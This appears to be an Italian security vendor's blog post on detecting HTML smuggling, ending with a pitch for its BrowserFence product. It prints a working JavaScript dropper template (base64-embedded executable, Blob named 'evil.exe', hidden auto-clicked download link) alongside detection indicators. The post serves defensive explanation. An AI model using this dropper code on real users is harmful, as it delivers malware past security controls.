+++
title = 'Rilevamento di HTML Smuggling'
date = 2024-06-21T17:04:20+02:00
draft = false
image = '/posts/html-smuggling/static/html-smuggling.png'
+++

## Introduzione

L'HTML smuggling è una tecnica avanzata e furtiva che sfrutta le funzionalità standard di HTML5 e JavaScript per evitare il rilevamento e distribuire Remote Access Trojans (RAT), malware bancari e altri software dannosi. Questo metodo viene sempre più adottato da gruppi di hacker sponsorizzati dallo stato e criminali informatici per infiltrarsi in governi, individui e aziende. Un esempio notevole è il gruppo NOBELIUM, ritenuto legato alla Russia, che ha utilizzato l'HTML smuggling per colpire organizzazioni governative e diplomatiche in tutto il mondo. I ricercatori di Microsoft hanno osservato che il gruppo NOBELIUM ha utilizzato allegati HTML malevoli in una campagna denominata EnvyScout. Questi allegati agiscono come dropper, capaci di de-offuscare e scrivere file ISO dannosi sul sistema della vittima.

## Come Funziona l'HTML Smuggling

Questo malware viene essenzialmente utilizzato per ottenere il controllo dei computer delle vittime, distribuire efficacemente payload e eseguire attacchi ransomware.

Nell'HTML smuggling, l'attaccante utilizza un allegato HTML appositamente creato che contiene uno script malevolo codificato. Quando la vittima apre questo file HTML malevolo nel proprio browser, il browser decodifica questo script incorporato, che, una volta eseguito, assembla ulteriormente il payload sul computer della vittima. Il vantaggio principale per gli attori di minacce è che, invece di trasmettere il payload attraverso la rete, il payload malevolo si assembla direttamente sul computer della vittima. Ciò rende la tecnica altamente evasiva, poiché può bypassare i controlli di sicurezza standard come proxy web, firewall e gateway di posta elettronica. Poiché il payload viene creato solo quando il file HTML malevolo viene caricato nel browser della vittima, le soluzioni di sicurezza vedono solo traffico HTML o JavaScript che può essere ulteriormente offuscato per evitare il rilevamento.

<img src="/posts/html-smuggling/static/HTMLsmuggling-1.jpg" alt="dove sono i pezzi" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">

## Analisi del Codice

In questo capitolo analizzeremo una versione di base di un payload HTML smuggling. [vedi il codice completo](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md)

#### Dati codificati in Base64

```javascript
//funzione di conversione
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

//malware.exe codificato in Base64
var file = 'TVqQAAMAAAAEAAAA//8AALgAA[...]nBkYgA=';
var data = base64ToArrayBuffer(file);
```

Come abbiamo osservato, il file HTML malevolo può distribuire malware sul computer della vittima attraverso vari metodi. In questo scenario, l'intero payload malevolo è codificato in base64 e incorporato direttamente all'interno del file HTML stesso. Possiamo vedere la variabile `file` che contiene il payload.

La funzione `base64ToArrayBuffer` converte il payload codificato nei byte effettivi che compongono il file malevolo.

È importante notare che gli attaccanti possono ideare metodi ancora più complessi per distribuire il malware. Ad esempio, potrebbero dividere il payload in più pezzi, recuperare parti di esso da remoto o utilizzare diversi standard di codifica e tecniche di crittografia. Queste strategie aumentano significativamente la probabilità di eludere le misure di sicurezza come proxy web, firewall e gateway di posta elettronica.

#### Blob di JavaScript

```javascript
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'evil.exe';
```

Questo è il nucleo dell'attacco. L'oggetto Blob consente la creazione di un file all'interno del browser utilizzando codice JavaScript. Ecco come Mozilla lo descrive:

```text
"L'interfaccia Blob rappresenta un blob, che è un oggetto simile a un file contenente dati grezzi immutabili; possono essere letti come testo o dati binari, oppure convertiti in un ReadableStream in modo che i suoi metodi possano essere utilizzati per elaborare i dati.
I blob possono rappresentare dati che non sono necessariamente in un formato nativo di JavaScript. L'interfaccia File è basata su Blob, ereditando le funzionalità del blob ed espandendole per supportare i file presenti sul sistema dell'utente."
```

<img src="/posts/html-smuggling/static/blob-struct.png" alt="dove sono i pezzi" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">
<br>
Pertanto, invece di fare affidamento sul server web per consegnare un file, un Blob può essere creato localmente utilizzando JavaScript. Ad esempio, un file "evil.exe" che normalmente verrebbe scaricato da un server può invece essere assemblato e scaricato direttamente sul sistema di destinazione utilizzando un tag anchor HTML con l'attributo download.

#### Download tramite anchor HTML

```javascript 
if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
    var a = document.createElement('a');
    console.log(a);
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

Questo frammento di codice verifica se il browser supporta `msSaveOrOpenBlob`. Se supportato (per versioni precedenti di Internet Explorer e Microsoft Edge), lo utilizza per salvare o aprire un oggetto Blob (blob) con un nome di file specificato (fileName). Se non supportato, crea un elemento `<a>` nascosto nel documento, imposta un URL Blob (url) per l'oggetto Blob (blob), assegna l'URL all'attributo href dell'elemento `<a>`, imposta l'attributo download per specificare il nome del file (fileName), simula un clic sull'elemento `<a>` per avviare il download e pulisce il tutto revocando l'URL Blob (url).

A questo punto, il file malevolo è memorizzato sul computer della vittima.

### Comportamento nel browser

Ora è facile immaginare i numerosi modi in cui un attaccante può escogitare per prelevare un file malevolo e ricostruirlo direttamente sul computer della vittima. Possiamo vedere questa fase come un'operazione ad alto livello in cui l'attaccante manipola codifiche, stringhe e varie risorse remote e incorporate. Tuttavia, a un certo punto, devono utilizzare specifiche API del browser (operazione a basso livello) per eseguire l'attacco. È qui che possiamo intervenire e agire!

#### Indicatori di Compromissione (IOC) a livello di browser

Ogni tecnica lascia tracce, e in questo caso, i nostri Indicatori di Compromissione (IOC) sono forniti dall'evento di creazione del Blob. Questo evento ha diversi parametri e opzioni, i più interessanti dei quali sono l'ArrayBuffer, che contiene il malware, e il tipo, che deve essere impostato su octet/stream.

<img src="/posts/html-smuggling/static/blob-event.png" alt="dove sono i pezzi" style="display: block; margin-left: auto; margin-right: auto; width: 70%; height: auto;">
<br>
<img src="/posts/html-smuggling/static/buffer-array.png" alt="dove sono i pezzi" style="display: block; margin-left: auto; margin-right: auto; width: 90%; height: auto;">
<br>
A questo punto, il file malevolo non può più essere offuscato, diviso o alterato in alcun altro modo. Deve essere completamente caricato in memoria, pronto per essere scaricato. Pertanto, è possibile monitorare l'allocazione della memoria e identificare questo tipo di file malevolo.

Successivamente, viene creato un elemento anchor che punta a un URL Blob con un parametro di download e probabilmente con uno stile `display:none`, seguito da un clic programmatico su di esso. Questa sequenza di azioni rappresenta un altro comportamento specifico che può essere identificato e monitorato per attività malevole.

```html
<a href="

blob:null/5f2c2f2a-0349-43d2-a6ec-276bd4efb082" download="evil.exe" style="display: none;"></a>
```

## Conclusione

In conclusione, l'HTML smuggling rappresenta un metodo sofisticato utilizzato dagli avversari informatici per aggirare le misure di sicurezza tradizionali e distribuire payload malevoli direttamente agli utenti ignari. Incorporando script codificati all'interno di file HTML apparentemente innocui, gli attaccanti possono evitare il rilevamento ed eseguire azioni dannose sui computer delle vittime. Questa tecnica comporta rischi significativi per individui, aziende e governi in tutto il mondo.

Noi di TeamFence abbiamo condotto un'analisi approfondita delle tecniche di HTML smuggling e comprendiamo l'importanza cruciale delle misure di difesa proattive. La nostra soluzione è progettata per rilevare e mitigare efficacemente questi attacchi furtivi. Sfruttando algoritmi di rilevamento avanzati e capacità di monitoraggio in tempo reale, BrowserFence identifica comportamenti sospetti associati all'HTML smuggling, come la creazione e la manipolazione di URL Blob e l'assemblaggio di payload malevoli in memoria.

Proteggi la tua organizzazione oggi con BrowserFence e rimani un passo avanti nel panorama in continua evoluzione delle minacce informatiche. Contattaci per saperne di più su come BrowserFence può difendere i tuoi asset digitali dall'HTML smuggling e garantire un ambiente informatico sicuro per la tua azienda.

<ul class="pt-4 d-flex gaps g-3 justify-content-center  animated" data-animate="fadeInUp" data-delay=".9">
    <li>
        <a href="#" class="btn btn-md btn-grad" data-overlay="bg-theme-grad-alternet"
           style="position: relative; top: 50px;">Installa BrowserFence</a>
    </li>
</ul>